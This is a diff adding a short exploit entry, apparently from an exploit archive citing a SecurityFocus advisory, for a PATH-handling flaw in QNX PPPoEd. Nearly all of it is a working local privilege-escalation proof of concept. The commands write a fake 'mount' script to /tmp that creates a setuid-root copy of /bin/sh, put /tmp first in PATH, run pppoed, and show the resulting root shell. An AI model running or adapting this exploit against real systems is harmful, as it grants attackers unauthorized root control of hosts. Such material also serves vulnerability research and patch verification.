@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/11105/info
+
+QNX PPoEd is reported prone to a problem that exists in the handling of paths to external executables that are employed by PPPoEd. Because of this, an attacker may be able to gain elevated privileges on a host with a vulnerable version of PPPoEd installed.
+
+$ cd /tmp
+$ cat << _EOF_ > mount
+#!/bin/sh
+cp /bin/sh /tmp/rootshell
+chown root /tmp/rootshell
+chmod 4777 /tmp/rootshell
+echo "Here comes your root shell"
+_EOF_
+
+$ chmod 755 mount
+$ export PATH=/tmp:$PATH
+$ /usr/sbin/pppoed
+$ ls -la /tmp
+-rwxr-xr-x 1 sandimas users 88 Aug 25 2004 mount
+-rwsrwxrwx 1 root 100 153384 Jun 22 2001 /tmp/rootshell
+$ /tmp/rootshell
+Here comes your root shell
+# uname -a
+QNX sandimas 6.1.0 2001/06/25-15:31:48 edt x86pc x86
+#
